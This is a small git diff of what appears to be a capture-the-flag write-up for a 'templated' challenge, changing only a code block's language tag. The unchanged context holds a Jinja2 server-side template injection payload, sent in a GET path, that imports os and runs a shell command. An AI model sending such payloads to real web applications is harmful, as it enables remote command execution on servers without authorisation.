@@ -30,7 +30,7 @@ Boom! template rendering applied.
 
 Let's jump in to try out RCE payloads. 
 
-```python
+```Python3
 GET /{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
 ```
 ![Image-5 Broken](/assets/templated/templated-5.png)
